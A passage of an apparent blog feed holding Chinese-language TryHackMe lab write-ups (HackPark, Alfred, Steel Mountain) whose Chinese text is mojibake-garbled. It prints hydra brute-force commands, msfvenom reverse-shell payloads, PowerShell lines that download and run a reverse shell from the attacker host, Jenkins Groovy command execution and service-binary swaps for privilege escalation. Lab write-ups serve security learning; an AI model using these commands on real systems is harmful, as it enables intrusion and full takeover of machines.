-p cmd/unix/reverse_bash <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.sh<br><br>Perl<br><br>msfvenom -p cmd/unix/reverse_perl <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.pl<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackPark</title>
    <link href="/2024/10/28/HackPark/"/>
    <url>/2024/10/28/HackPark/</url>
    
    <content type="html"><![CDATA[<h1 id="HackPark"><a href="#HackPark" class="headerlink" title="HackPark"></a>HackPark</h1><h2 id="ä¿¡æ¯æ”¶é›†ï¼š"><a href="#ä¿¡æ¯æ”¶é›†ï¼š" class="headerlink" title="ä¿¡æ¯æ”¶é›†ï¼š"></a>ä¿¡æ¯æ”¶é›†ï¼š</h2><p>nmapæ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°åªæœ‰80å’Œ3389ç«¯å£å¼€æ”¾ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202410282339916.png" alt="image-20241028233904024"></p><p>æ‰«ä¸‹ç›®å½•</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202410290018155.png" alt="image-20241029001844975"></p><p>æ‰«åˆ°åå°ç™»å½•å…¥å£ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202410290027908.png" alt="image-20241029002730836"></p><p>è¿™é‡Œå°è¯•åˆ©ç”¨hydraè¿›è¡Œå¯†ç çš„çˆ†ç ´ï¼Œç”¨æˆ·åè®¾ç½®æˆadmin.</p><p>åˆ©ç”¨hydraè¿›è¡Œpostç™»å½•è¡¨å•çš„çˆ†ç ´ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202410292056865.png" alt="image-20241029205635372"></p><p>æ³¨æ„æ ¼å¼ã€‚</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pf">hydra -P <span class="hljs-variable">&lt;å•è¯åˆ—è¡¨&gt;</span> -v <span class="hljs-variable">&lt;ip&gt;</span> <span class="hljs-variable">&lt;åè®®&gt;</span>   å¯¹æ‚¨é€‰æ‹©çš„åè®®è¿›è¡Œæš´åŠ›ç ´è§£<br>hydra -v -V -u -L <span class="hljs-variable">&lt;ç”¨æˆ·ååˆ—è¡¨&gt;</span> -P <span class="hljs-variable">&lt;å¯†ç åˆ—è¡¨&gt;</span> -t <span class="hljs-number">1</span> -u <span class="hljs-variable">&lt;ip&gt;</span> <span class="hljs-variable">&lt;åè®®&gt;</span><br>æ‚¨å¯ä»¥ä½¿ç”¨ Hydra æš´åŠ›ç ´è§£ç”¨æˆ·åå’Œå¯†ç ã€‚å®ƒå°†å¾ªç¯éå†åˆ—è¡¨ä¸­çš„æ¯ä¸ªç»„åˆã€‚ï¼ˆ-vV = è¯¦ç»†æ¨¡å¼ï¼Œæ˜¾ç¤ºç™»å½•å°è¯•ï¼‰<br>hydra -t <span class="hljs-number">1</span> -V -f -l <span class="hljs-variable">&lt;ç”¨æˆ·å&gt;</span> -P <span class="hljs-variable">&lt;å•è¯åˆ—è¡¨&gt;</span> rdp://<span class="hljs-variable">&lt;ip&gt;</span><br>ä½¿ç”¨å¯†ç åˆ—è¡¨æ”»å‡» Windows è¿œç¨‹æ¡Œé¢ã€‚<br>hydra -l <span class="hljs-variable">&lt;ç”¨æˆ·å&gt;</span> -P .<span class="hljs-variable">&lt;å¯†ç åˆ—è¡¨&gt;</span> <span class="hljs-variable">$ip</span> -V http-form-post &#x27;/wp-login.php:<span class="hljs-keyword">log</span>=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=<span class="hljs-number">1</span>:S=Location&#x27;<br>ä¸º Hydra åˆ¶å®šæ›´å…·ä½“çš„å¼ºåˆ¶è¦æ±‚ã€‚<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ç™»è¿›å»ä¹‹åæŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ï¼Œæ˜¯ä¸€ä¸ª3.3.6.0 çš„ã€‚</p><p>exploitæ‰¾ä¸€ä¸ªå¯¹åº”çš„ç‰ˆæœ¬è¿›è¡Œåˆ©ç”¨ã€‚ç¨ä½œä¿®æ”¹å³å¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041541347.png" alt="image-20241104154126236"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041549972.png" alt="image-20241104154958884"></p><p>è¿™é‡Œè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041553835.png" alt="image-20241104155322770"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»åå¼¹æˆåŠŸã€‚</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ä½†æ˜¯ç°åœ¨è¿˜ä¸æ˜¯æœ€é«˜æƒé™ï¼Œéœ€è¦è¿›è¡Œä¸€ä¸ªææƒã€‚</p><p>å¯ä»¥ç”¨msfç”Ÿæˆä¸€ä¸ªexeæ–‡ä»¶ ç„¶åä¸Šä¼ ä¸Šå»ï¼Œåˆ©ç”¨meterpreterèº«ä»½æ¥è¿›è¡Œä¿¡æ¯çš„æ”¶é›†å’Œè¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">msfvenom -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp -<span class="hljs-selector-tag">a</span> x86 <span class="hljs-attr">--encoder</span> x86/shikata_ga_nai LHOST=<span class="hljs-number">10.14</span>.<span class="hljs-number">74.6</span> LPORT= -f exe -o shell-name.exe<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨kaliä¸Šå¼€å¯ä¸€ä¸ªhttpæœåŠ¡ï¼Œåœ¨windowsé‚£ä¸€ç«¯åˆ©ç”¨powershellä¸Šä¼ ç”Ÿæˆçš„æ–‡ä»¶ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041620165.png" alt="image-20241104162037084"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">powershell -c wget &#x27;http://10.14.74.6:<span class="hljs-number">8080</span>/shell-name.exe&#x27; -outfile &#x27;shell.exe&#x27;<br><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041626240.png" alt="image-20241104162622191"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041626191.png" alt="image-20241104162648143"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»ä¸Šä¼ æˆåŠŸäº†ã€‚</p><p>ä½†æ˜¯å»æŸ¥çœ‹çš„æ—¶å€™å¹¶æ²¡æœ‰å‘ç°è¿™ä¸ªexeæ–‡ä»¶ã€‚</p><p>é‚£å°±è¦è€ƒè™‘å…¶ä»–ç›®å½•äº†ã€‚</p><p>å»çœ‹äº†ä¸€ä¸‹tempç›®å½•ï¼Œå‘ç°å¯ä»¥æˆåŠŸã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041646273.png" alt="image-20241104164658056"></p><p>ä¸Šé¢æ˜¯æµ‹è¯•äº†ä¸€ä¸‹ï¼Œæ˜¯å¦èƒ½å†™å…¥æ–‡ä»¶ã€‚</p><p>ä¸Šä¼ æˆåŠŸä¹‹åè¿è¡Œé‚£ä¸ªexeæ–‡ä»¶ ç„¶åæ¥æ”¶åå¼¹çš„shellã€‚</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST your-thm-ip</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT listening-port</span> <br>run<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041655734.png" alt="image-20241104165502649"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸäº†ã€‚</p><p>ä¸‹é¢å°±æ˜¯ä¿¡æ¯æ”¶é›†ã€‚</p><p>åˆ©ç”¨WinPeasè¿›è¡Œæšä¸¾ã€‚</p><p><a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20231203-9cdcb38f">https://github.com/peass-ng/PEASS-ng/releases/tag/20231203-9cdcb38f</a></p><p>å°†winPeas64.exeä¸Šä¼ ä¸Šå»ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041750247.png" alt="image-20241104175037089"></p><p>ç„¶åè¿è¡Œã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041752496.png" alt="image-20241104175229407"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041802245.png" alt="image-20241104180219138"></p><p>è¿™èƒ½æšä¸¾å‡ºæŒºå¤šä¿¡æ¯çš„ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041809417.png" alt="image-20241104180905339"></p><p>è¿™èƒ½æ‰¾åˆ°å¼‚å¸¸çš„æœåŠ¡ã€‚æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæœåŠ¡çš„é…ç½®ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041822194.png" alt="image-20241104182203120"></p><p>åˆ°C:\PROGRA<del>2\SYSTEM</del>1ç›®å½•ä¸‹çœ‹äº†ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰ä¸ªeventsç›®å½•ï¼Œè¿›å»çœ‹çœ‹ï¼Œæœ‰ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œå¤§æ¦‚æ¯éš”30ç§’æ‰§è¡Œä¸€æ¬¡ï¼Œå¹¶ä¸”èº«ä»½æ˜¯Administratorã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041824111.png" alt="image-20241104182424020"></p><p>æˆ‘ä»¬å¯ä»¥ç”Ÿæˆä¸€ä¸ªæ¶æ„çš„exeæ–‡ä»¶ï¼Œç„¶åä»£æ›¿è¿™ä¸ªMessage.exeæ–‡ä»¶ï¼Œæœ€ç»ˆè®©å®ƒä»¥administratorçš„èº«ä»½è¿è¡Œèµ·æ¥ã€‚</p><p>å°†åŸæ¥çš„Message.exeæ›¿æ¢æˆä¸€ä¸ªæ–°çš„åå­— ç„¶åå°†æ¶æ„çš„exeæ¢æˆMessage.exe</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">move</span> Message.<span class="hljs-keyword">exe</span> Message2.<span class="hljs-keyword">exe</span><br><span class="hljs-keyword">move</span> <span class="hljs-keyword">c</span>:\Windows\Temp\<span class="hljs-keyword">shell</span>-name.<span class="hljs-keyword">exe</span>  Message.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨msfç›‘å¬ç«¯å£ï¼Œæ¥æ”¶shellå³å¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041924112.png" alt="image-20241104192405047"></p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Alfred</title>
    <link href="/2024/09/21/Alfred/"/>
    <url>/2024/09/21/Alfred/</url>
    
    <content type="html"><![CDATA[<h1 id="Alfred"><a href="#Alfred" class="headerlink" title="Alfred"></a>Alfred</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«ä¸‹ç«¯å£ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212159400.png" alt="image-20240921215925176"></p><p>8080ç«¯å£æ˜¯ä¸€ä¸ªåå°ç™»å½•çš„ï¼Œå¼±å£ä»¤admin adminè¿›è¡Œç™»å½•ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://www.jenkins.io/doc/book/managing/script-console/">https://www.jenkins.io/doc/book/managing/script-console/</a></p><p>é‡Œé¢æœ‰è¿™æ ·ä¸€å¥è¯ï¼š</p><p>Jenkins å…·æœ‰ Groovy è„šæœ¬æ§åˆ¶å°ï¼Œå…è®¸ç”¨æˆ·åœ¨ Jenkins æ§åˆ¶å™¨è¿è¡Œæ—¶æˆ–ä»£ç†è¿è¡Œæ—¶è¿è¡Œä»»æ„ Groovy è„šæœ¬ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212240071.png" alt="image-20240921224028866"></p><p>å»è®¿é—®script</p><p>ç„¶åå»ç½‘ä¸Šäº†æœäº†ä¸€ä¸‹Groovyå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ã€‚å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/yyhuni/p/18012041">https://www.cnblogs.com/yyhuni/p/18012041</a></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy">println <span class="hljs-string">&quot;whoami&quot;</span>.execute().text<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212242080.png" alt="image-20240921224245004"></p><p>å¯ä»¥çœ‹åˆ°å‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å»githubä¸Šé¢æ‰¾ä¸€ä¸ªpowershellåå¼¹shellçš„è„šæœ¬ã€‚</p><p>è¿™é‡Œä½¿ç”¨çš„nishangé‡Œé¢çš„ä»£ç  </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212306244.png" alt="image-20240921230634185"></p><p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a></p><p>åœ¨æ”»å‡»æœºä¸Šé¢å¼€ä¸€ä¸ªpythonæœåŠ¡ï¼Œä½¿å¾—80å¼€å¯ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">iex</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="hljs-built_in">Invoke-PowerShellTcp</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> your<span class="hljs-literal">-ip</span> <span class="hljs-literal">-Port</span> your<span class="hljs-literal">-port</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212254364.png" alt="image-20240921225432216"></p><p>å¯ä»¥çœ‹åˆ°æ™®é€šshellå·²ç»æ‹¿åˆ°ã€‚</p><p>ä½¿ç”¨msfvenomç”Ÿæˆçš„exeæ–‡ä»¶è·å–meterpreter </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="hljs-attribute">LHOST</span>=10.14.74.6 <span class="hljs-attribute">LPORT</span>=1234 -f exe -o shell-name.exe<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆå®Œä¹‹ååˆ©ç”¨ </p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">powershell &quot;(New-Object System.Net.WebClient).Downloadfile(<span class="hljs-string">&#x27;http://your-thm-ip:8000/shell-name.exe&#x27;</span>,<span class="hljs-string">&#x27;shell-name.exe&#x27;</span>)&quot;<br></code></pre></td></tr></table></figure><p> è¿›è¡ŒåŒæ ·çš„æ“ä½œã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212348592.png" alt="image-20240921234817471"></p><p>å·²ç»ä¸Šä¼ è¿›å»äº†ã€‚</p><p>ç„¶åè¿›å…¥msfè¿›è¡Œç›‘å¬ç«¯å£ã€‚</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST your-thm-ip</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT listening-port</span> <br>run<br></code></pre></td></tr></table></figure><p>æœ€åè¿è¡Œexeæ–‡ä»¶ Start-Process â€œshell-name.exeâ€ ç­‰å¾…ç›‘å¬</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212357581.png" alt="image-20240921235747489"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ç°åœ¨è¿˜ä¸æ˜¯administratoræƒé™ã€‚</p><p>å…ˆåˆ°powershellæ¨¡å¼ä¸‹</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">load powershell<br>powershell_shell<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸€ä¸‹åˆ†é…çš„æƒé™ whoami /priv</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409262144405.png" alt="image-20240926214433185"></p><p>è¿™é‡Œçš„è¯å…¶å®èƒ½ææƒçš„åœ°æ–¹ä¸å°‘ï¼Œä½†æ˜¯æœ‰çš„éœ€è¦è¿œç¨‹ç™»é™†åˆ°windowsä¸Šæ‰è¡Œï¼Œä½†ä¹Ÿæœ‰æˆ‘ä»¬èƒ½ç”¨çš„ã€‚</p><p> <strong>SeImpersonatePrivilege</strong>å’Œ<strong>SeDebugPrivilege</strong></p><p>å¯¹äºæ¨¡æ‹Ÿä»¤ç‰Œï¼Œæœ‰ä¸åŒçš„çº§åˆ«ï¼š</p><ul><li>SecurityAnonymousï¼šå½“å‰ç”¨æˆ·/å®¢æˆ·ç«¯æ— æ³•å†’å……å…¶ä»–ç”¨æˆ·/å®¢æˆ·ç«¯</li><li>SecurityIdentificationï¼šå½“å‰ç”¨æˆ·/å®¢æˆ·ç«¯å¯ä»¥è·å–å®¢æˆ·ç«¯çš„èº«ä»½å’Œæƒé™ï¼Œä½†ä¸èƒ½å†’å……å®¢æˆ·ç«¯</li><li>SecurityImpersonationï¼šå½“å‰ç”¨æˆ·/å®¢æˆ·ç«¯å¯ä»¥åœ¨æœ¬åœ°ç³»ç»Ÿä¸Šæ¨¡æ‹Ÿå®¢æˆ·ç«¯çš„å®‰å…¨ä¸Šä¸‹æ–‡</li><li>SecurityDelegationï¼šå½“å‰ç”¨æˆ·/å®¢æˆ·ç«¯å¯ä»¥åœ¨è¿œç¨‹ç³»ç»Ÿä¸Šæ¨¡æ‹Ÿå®¢æˆ·ç«¯çš„å®‰å…¨ä¸Šä¸‹æ–‡</li></ul><p>ä¸‹é¢æ˜¯ä¸€äº›æ¯”è¾ƒå¸¸è§çš„æ»¥ç”¨çš„æƒé™ï¼š</p><ul><li>SeImpersonatePrivilege</li><li>SeAssignPrimaryPrivilege</li><li>SeTcbPrivilege</li><li>SeBackupPrivilege</li><li>SeRestorePrivilege</li><li>SeCreateTokenPrivilege</li><li>SeLoadDriverPrivilege</li><li>SeTakeOwnershipPrivilege</li><li>SeDebugPrivilege</li></ul><p>å‚è€ƒ:<a href="https://www.exploit-db.com/papers/42556">https://www.exploit-db.com/papers/42556</a></p><p>ä¸‹é¢æ˜¯å†meterpreterä¸­ä½¿ç”¨è¿™ä¸ªææƒæ–¹æ³•ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">load incognito  <span class="hljs-regexp">//</span>åŠ è½½æ¨¡å—<br>list_tokens -g   <span class="hljs-regexp">//</span>æŸ¥çœ‹å¯ç”¨ä»¤ç‰Œ<br>impersonate_token <span class="hljs-string">&quot;BUILTIN\Administrators&quot;</span>  <span class="hljs-regexp">//</span>æ¨¡æ‹Ÿç®¡ç†å‘˜ä»¤ç‰Œ<br>ps  <span class="hljs-regexp">//</span>æŸ¥çœ‹è¿›ç¨‹<br>migrate PID <span class="hljs-regexp">//</span>è¿ç§»è¿›ç¨‹<br><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409262208224.png" alt="image-20240926220853152"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409262211838.png" alt="image-20240926221129775"></p><p>è¿™æ ·å³ä¾¿æœ‰äº†æ›´é«˜æƒé™ï¼Œä½†æ˜¯ä»ç„¶ä¸æ˜¯ç‰¹æƒç”¨æˆ·ï¼Œæ˜¯ç”±äº Windows å¤„ç†æƒé™çš„æ–¹å¼ - å®ƒä½¿ç”¨è¿›ç¨‹çš„ä¸»ä»¤ç‰Œè€Œä¸æ˜¯æ¨¡æ‹Ÿä»¤ç‰Œæ¥ç¡®å®šè¿›ç¨‹å¯ä»¥åšä»€ä¹ˆæˆ–ä¸èƒ½åšä»€ä¹ˆã€‚</p><p>æˆ‘ä»¬psçœ‹ä¸€ä¸‹è¿›ç¨‹ï¼Œæ‰¾ä¸getuidä¸€æ ·çš„ç¨‹åºã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409262348812.png" alt="image-20240926234823536"></p><p>è¿˜æ˜¯æœ‰æŒºå¤šçš„ã€‚ ä½¿ç”¨å‘½ä»¤è¿ç§»ï¼Œè¿ç§»åˆ°ä¸getuidåç§°ä¸€æ ·çš„ç¨‹åºã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409262355354.png" alt="image-20240926235503241"></p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Steel Mountain</title>
    <link href="/2024/09/21/Steel%20Mountain/"/>
    <url>/2024/09/21/Steel%20Mountain/</url>
    
    <content type="html"><![CDATA[<h1 id="Steel-Mountain"><a href="#Steel-Mountain" class="headerlink" title="Steel Mountain"></a>Steel Mountain</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>é¦–å…ˆè®¿é—®ä¸€ä¸‹ç½‘ç«™ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211453703.png" alt="image-20240921145336352"></p><p>è¿™æœ‰ä¸€ä¸ªæœ€ä½³å‘˜å·¥çš„å›¾ç‰‡ï¼Œä½†æˆ‘ä»¬å¹¶ä¸çŸ¥é“åå­—ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ç½‘é¡µæºä»£ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211454459.png" alt="image-20240921145433982"></p><p>Bill HarPerå°±æ˜¯ä»–çš„åå­—ã€‚</p><p>nmapçœ‹ä¸€ä¸‹å¼€æ”¾çš„ç«¯å£ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211540971.png" alt="image-20240921154017827"></p><h2 id="æ™®é€šshell"><a href="#æ™®é€šshell" class="headerlink" title="æ™®é€šshell"></a>æ™®é€šshell</h2><p>Rejetto <em>HTTP File Server</em> 2.3ç‰ˆæœ¬å­˜åœ¨æ¼æ´ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211546813.png" alt="image-20240921154629676"></p><p>æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„ã€‚</p><p>æ˜¯ä¸€ä¸ªCVE <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6287">2014-6287</a></p><p>ç„¶åmsfé‡Œé¢ä¹Ÿæœ‰ï¼Œä¸Šçº¿msfå°±è¡Œã€‚</p><p>å°±æ˜¯è®¾ç½®å¥½å‚æ•°å³å¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211616343.png" alt="image-20240921161627246"></p><p>ç°åœ¨è·å¾—çš„æ˜¯æ™®é€šç”¨æˆ·çš„æƒé™ï¼Œä¸‹é¢å°±æ˜¯è¿›è¡Œææƒã€‚</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ä½¿ç”¨Powerupçš„powershellè„šæœ¬ã€‚</p><p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1</a></p><p>å…ˆä½¿ç”¨uploadä¸Šä¼ ä¸Šå»ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211634874.png" alt="image-20240921163432739"></p><p>åœ¨meterpreterä¸­è¿›è¡Œpowershellæ¨¡å¼ï¼Œéœ€è¦å…ˆè¾“å…¥ load powershellåŠ è½½è¿™ä¸ªæ¨¡å¼ï¼Œç„¶åè¾“å…¥powershell_shell</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211637083.png" alt="image-20240921163702001"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211640386.png" alt="image-20240921164034230"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211642334.png" alt="image-20240921164245162"></p><p>è¿™äº›éƒ½æ ‡è®°ä¸ºtrue å¾ˆæ˜æ˜¾æ˜¯åˆ©ç”¨æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„è¿›è¡Œææƒã€‚</p><p>ä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªexeæ–‡ä»¶ã€‚</p><p>ç„¶åå¼€ä¸€ä¸ªpythonæœåŠ¡ï¼Œä¸Šä¼ è¿›å»ï¼ŒæŠŠè¿™ä¸ªexeæ–‡ä»¶ç»™ä»£æ›¿ä¸€ä¸‹ï¼Œç„¶åé‡å¯æœåŠ¡ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211722340.png" alt="image-20240921172258165"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211723386.png" alt="image-20240921172313274"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211723691.png" alt="image-20240921172323617"></p><p>å¯ä»¥çœ‹åˆ°ææƒæˆåŠŸã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
